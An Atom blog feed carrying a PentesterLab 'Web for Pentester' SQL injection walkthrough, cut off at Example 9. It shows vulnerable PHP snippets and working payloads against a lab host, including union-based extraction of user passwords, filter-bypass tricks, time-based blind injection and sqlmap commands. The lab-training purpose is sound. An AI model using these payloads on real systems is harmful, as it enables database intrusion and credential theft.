<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Pentesterlab | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/pentesterlab/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2015-05-22T07:44:34-04:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] Web for Pentester - SQL Injection]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/22/pentesterlab-web-for-pentester-sql-injection/"/>
    <updated>2015-05-22T05:53:28-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/22/pentesterlab-web-for-pentester-sql-injection</id>
    <content type="html"><![CDATA[<p>&ldquo;This course details all you need to know to start doing web penetration testing. PentesterLab tried to put together the basics of web testing and a summary of the most common vulnerabilities with the LiveCD to test them.&rdquo; &ndash; PentesterLab</p>

<p>Due to this is quite a long course, I have to divide the course into several parts and this one is focus on Cross Site Script attack which is well known as XSS. More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/web_for_pentester/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">course</a> is highly recommanded to read.</p>

<p>Difficulty: 1 / 5</p>

<!-- more -->


<h2>Example 1</h2>

<p>Code review:
<figure class='code'><figcaption><span>example1.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">name</span><span class="o">=&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
</span><span class='line'>    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>There is no input validation on parameter <em>$_GET[&ldquo;name&rdquo;]</em>, so I can exploit it directly with the injection payload: <code>' or 1=1-- -</code>. After injection, the variable <em>$sql</em> will become <code>SELECT * FROM users where name='' or 1=1-- -'</code> which will return all the entries in table users.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example1.php?name=root' or 1=1-- -</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example1.php?name=root" --dbs --banner</code></p>

<h2>Example 2</h2>

<p>Code review:
<figure class='code'><figcaption><span>example2.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span> <span class="o">/&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ERROR</span> <span class="nx">NO</span> <span class="nx">SPACE</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">name</span><span class="o">=&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'><span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the source code above, we know that the developer filtered SPACE in user input. However we can use comment /**/ or TAB/HT (%09, URL encoded) to bypass space filter.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example2.php?name=root'%09and%09'1'='1</code></p>

<p><code>http://10.10.10.129/sqli/example2.php?name=root'/**/union/**/select/**/1,(select/**/name/**/from/**/users/**/limit/**/3,1),(select/**/passwd/**/from/**/users/**/limit/**/3,1),4,5/**/and/**/'1'='2</code></p>

<p><img class="left" src="/downloads/webforpentester_sqli/1.png"></p>

<p>SQLMAP exploit:
In sqlmap, we can set parameter &ldquo;<em><font color="red">&ndash;tamper=space2comment</font></em>&rdquo; to replace space with comment.</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example2.php?name=root" --dbs --tamper=space2comment</code></p>

<h2>Example 3</h2>

<p>Code review:
<figure class='code'><figcaption><span>example3.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nx">\s</span><span class="o">+/&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ERROR</span> <span class="nx">NO</span> <span class="nx">SPACE</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">name</span><span class="o">=&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'><span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the developer use <a href="http://php.net/manual/en/regexp.reference.escape.php">PCRE regex (<strong><em>\s+</em></strong>)</a> to filter one or more sequential spaces (which including TAB/HT). However, I still can use comment <code>/**/</code> to bypass this filter.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example3.php?name=root'/**/union/**/select/**/1,(select/**/name/**/from/**/users/**/limit/**/3,1),(select/**/passwd/**/from/**/users/**/limit/**/3,1),4,5/**/and/**/'1'='2</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example3.php?name=root" --dbs --tamper=space2comment</code></p>

<h2>Example 4</h2>

<p>Code review:
<figure class='code'><figcaption><span>example4.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$sql</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">id</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$sql</span><span class="o">.=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;])</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the developer use function &ldquo;<em><a href="http://php.net/manual/en/function.mysql-real-escape-string.php">mysql_real_escape_string</a></em>&rdquo; to prevent SQL injection from the following characters <code>\x00, \n, \r, \, ', " and \x1a</code></p>

<p>However, in this case, &lsquo;id&rsquo; is used as integrate number which is not quoted by <code>'</code>, it is still vulnerable to SQL injection.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example4.php?id=2 or 1=1</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example4.php?id=2" --dbs</code></p>

<h2>Example 5</h2>

<p>Code review:
<figure class='code'><figcaption><span>example5.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/^</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+/&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ERROR</span> <span class="nx">INTEGER</span> <span class="nx">REQUIRED</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">id</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span> <span class="p">;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'><span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>&ldquo;I guess the beginning of the story &hellip;&hellip; But I didn&rsquo;t expect the end of the story.&rdquo; &ndash; Shakespeare</p>

<p>The incorrect regular expression failed to protect SQL injection, it only make sure the input of <em><font color="red">id</font></em> is start from integrate number but it could be followed by everything.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example5.php?id=2 or 1=1</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example5.php?id=2" --dbs</code></p>

<h2>Example 6</h2>

<p>Code review:
<figure class='code'><figcaption><span>example6.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+</span><span class="err">$</span><span class="o">/&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ERROR</span> <span class="nx">INTEGER</span> <span class="nx">REQUIRED</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">id</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span> <span class="p">;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'><span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>The incorrect regular expression failed to protect SQL injection, it only make sure the input of <em><font color="red">id</font></em> is end by integrate number but the injection still happened.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example6.php?id=2 or 1=1</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example6.php?id=2" --dbs</code></p>

<h2>Example 7</h2>

<p>Code review:
<figure class='code'><figcaption><span>example7.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/^-?</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+</span><span class="err">$</span><span class="o">/</span><span class="nx">m</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ERROR</span> <span class="nx">INTEGER</span> <span class="nx">REQUIRED</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">id</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;];</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'><span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the beginning and the end of the string are correctly checked but due to the regular expression contains the <a href="http://php.net/manual/en/reference.pcre.pattern.modifiers.php">PRCE_MULTILINE modifier (m)</a>, it makes the regex filter can be bypassed only match one line, does not matter the start or the end. So the SQL injection still happened in following ways.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example7.php?id=2%0a or 1=1</code></p>

<p><code>http://10.10.10.129/sqli/example7.php?id=2 or 123=%0a123</code></p>

<p><code>http://10.10.10.129/sqli/example7.php?id=2 or %0a123=%0a123</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example7.php?id=2%0a*" --dbs</code></p>

<h2>Example 8</h2>

<p>Code review:
<figure class='code'><figcaption><span>example8.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">ORDER</span> <span class="nx">BY</span> <span class="o">&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
</span><span class='line'><span class="s2">    </span><span class="si">$sql</span><span class="s2"> .= mysql_real_escape_string(</span><span class="si">$_GET[&quot;order&quot;]</span><span class="s2">).&quot;</span><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the source code above, we need to inject payload into &ldquo;<em>order by</em>&rdquo; statement. Due to the function &ldquo;<em>extractvalue</em>&rdquo; does not work here, the error information will not display, I have to choose <a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html#blind">Time-based blind injection</a>.</p>

<p>PoC:</p>

<p>// the page will delay 5 seconds, it means the first character of database() is &lsquo;e&rsquo;
<code>http://10.10.10.129/sqli/example8.php?order=id</code>,(select sleep(5) from dual where ASCII(substring(database(),1,1)) = 101)%23`</p>

<p>// the page will display immediately, it means the first character of database() is not &lsquo;f&rsquo;
<code>http://10.10.10.129/sqli/example8.php?order=id</code>,(select sleep(5) from dual where ASCII(substring(database(),1,1)) = 102)%23`</p>

<p>Here I use mysql default null table <a href="http://en.wikipedia.org/wiki/DUAL_table">DUAL</a> to construct the payload.</p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example8.php?order=id%60*" --dbs --batch</code></p>

<h2>Example 9</h2>

<p>Code review:
<figure class='code'><figcaption><span>example9.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
